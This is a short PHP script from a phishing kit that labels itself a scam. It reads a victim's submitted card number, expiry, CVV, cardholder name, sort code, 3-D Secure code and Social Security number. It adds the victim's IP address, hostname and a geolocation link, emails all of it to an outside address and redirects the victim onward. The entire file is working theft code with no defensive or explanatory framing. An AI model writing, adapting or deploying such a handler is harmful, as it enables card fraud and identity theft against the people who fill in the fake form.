<?php



$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$message .= "|----------|Scam by An[O_o]nisma--------------|\n";
$message .= "|C/R/D   : ".$_POST['number']."\n";
$message .= "|EXP / Month: ".$_POST['month']."\n";
$message .= "| EXP / Year : ".$_POST['year']."\n";
$message .= "|C/V/V: ".$_POST['cv']."\n";
$message .= "|C/R/D - H/D/R   : ".$_POST['holder']."\n";
$message .= "|S/R/T - C/D : ".$_POST['sort']."\n";
$message .= "|3/D - S/C/R   : ".$_POST['3D']."\n";
$message .= "|S/S/N    : ".$_POST['S-S-N']."\n";
$message .= "|---------------|Info|-------------------|\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|HostName : ".$hostname."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "|----------|Scam by An[O_o]nisma|--------------|\n";
$send = "hamilanors@gmail.com";
$subject = "~ Nuevos Resultados ~ | $ip";
{
mail("$send", "$subject", $message);   
}
header("Location:../info2.html");
?>